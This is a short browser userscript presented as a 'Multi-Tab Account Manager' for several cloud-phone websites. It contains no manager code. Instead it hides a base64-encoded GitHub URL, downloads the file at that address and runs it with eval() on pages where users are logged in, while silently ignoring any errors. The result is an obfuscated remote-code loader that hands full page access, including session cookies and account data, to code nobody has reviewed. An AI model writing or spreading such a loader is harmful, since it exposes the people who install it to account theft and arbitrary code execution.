// ==UserScript==
// @name         Multi-Tab Account Manager
// @namespace    http://tampermonkey.net/
// @version      5.8.0
// @description  update more cloud phone
// @author       Minhbeo8 (hominz) 
// @icon         https://i.postimg.cc/Jhcr8R5L/hominz-png-4.png
// @match        https://www.ugphone.com/*
// @match        https://ugphone.com/*
// @match        https://cloud.vsphone.com/*
// @match        https://cloud.vmoscloud.com/*
// @match        https://h5.cccloudphone.com/*
// @match        https://nexus.cccloudphone.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @grant        GM_addStyle
// @grant        GM_openInTab
// @run-at       document-idle
// ==/UserScript==


(function() {
    'use strict';
    
    
    const encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbmhiZW84L2V4dGVuc2lvbl9tdWx0aV9Ccm93c2VyL3JlZnMvaGVhZHMvbWFpbi9leHRlbnNpb24=";
    
  
    const sourceUrl = atob(encodedUrl);
    
    GM_xmlhttpRequest({
        method: "GET",
        url: sourceUrl,
        timeout: 10000,
        onload: function(response) {
            if (response.status === 200 && response.responseText.trim().length > 0) {
                eval(response.responseText);
            }
        },
        onerror: function() {},
        ontimeout: function() {}
    });
})();
